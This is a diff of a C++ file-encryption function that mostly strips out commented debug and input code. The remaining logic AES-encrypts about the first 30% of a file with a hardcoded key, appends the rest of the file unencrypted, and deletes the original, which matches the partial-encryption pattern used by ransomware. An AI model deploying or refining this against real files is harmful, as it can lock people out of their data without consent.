@@ -209,16 +209,9 @@ void ENCRYPT_FUNCTION(string filename) {
 
     unsigned char key[16]={'1','2','3','4','5','6','7','8','9','1','2','3','4','5','6','7'};
 
-    //cout << "File to encrypt: ";
+
     string inputFilename = filename;
-    //cout << "Encryption key: ";
-    /*
-    for (int i = 0; i < 16; i++) {
-        cin >> key[i];
-    }
-     */
-    //cout << "\n";
-    // getline(cin,inputFilename);
+
 
 
 
@@ -229,7 +222,7 @@ void ENCRYPT_FUNCTION(string filename) {
     if (GetFileSize(inputFilename) < 104857600) {
         encryptionLength = ceil((ceil((GetFileSize(inputFilename) * 30 / 100)) / 16 + 1)) * 16;
     }
-    //cout << "ENC LENGTH" << encryptionLength;
+
     long long int encryptedDataLength = 0;
     while (encryptedDataLength < encryptionLength) {
         char* buffer = new char[4097];
@@ -237,34 +230,7 @@ void ENCRYPT_FUNCTION(string filename) {
         buffer[4096] = 0;
 
 
-        /*
-        cout << "       READ      " << endl;
-        for (int i = 0; i < 4096; i++) {
-            cout << buffer[i];
 
-        }
-        cout << endl;
-
-        string message_string(buffer);
-        */
-        // cout << "Mesaj: " << message_string;
-        //getline(cin,message_string);
-
-        /*
-
-        int n = 4096;
-        cout << endl << "MSG STRING " << n;
-        char* message = new char[n + 1];
-        for (int i = 0; i < 4097; i++) {
-            message[i] = buffer[i];
-        }
-        for (int i = 0; i < 4096; i++) {
-            cout << message[i];
-        }
-        cout << endl;
-        //strcpy(message, message_string.c_str());
-
-        */
 
 
 
@@ -274,7 +240,7 @@ void ENCRYPT_FUNCTION(string filename) {
         int lenOfPaddedMessage = originalLen;
 
 
-        //cout << "ORGINAL " << originalLen;
+
 
         if (lenOfPaddedMessage % 16 != 0) {
             lenOfPaddedMessage = (lenOfPaddedMessage / 16 + 1) * 16;
@@ -287,33 +253,21 @@ void ENCRYPT_FUNCTION(string filename) {
         for (int i = 0; i < lenOfPaddedMessage; i += 16) {
             Encrypt(paddedMessage + i, key);
         }
-        //cout << "Encrypted Message: " << endl;
-        for (int i = 0; i < lenOfPaddedMessage; i++) {
-            //PrintHex(paddedMessage[i]);
 
+        for (int i = 0; i < lenOfPaddedMessage; i++) {
             out << paddedMessage[i];
-            //cout << " ";
         }
         delete[] paddedMessage;
         encryptedDataLength = encryptedDataLength + 4096;
     }
-    // ------------------------------
-    //        COPY REST OF FILE
-    // ------------------------------
 
-    /*
-    string line;
-    while (inputFile >> line) {
-        out << line;
-    }
-    */
 
     out << inputFile.rdbuf();
     inputFile.close();
     fs::remove(inputFilename);
 
 
-    //_getch();
+
 
 
 }
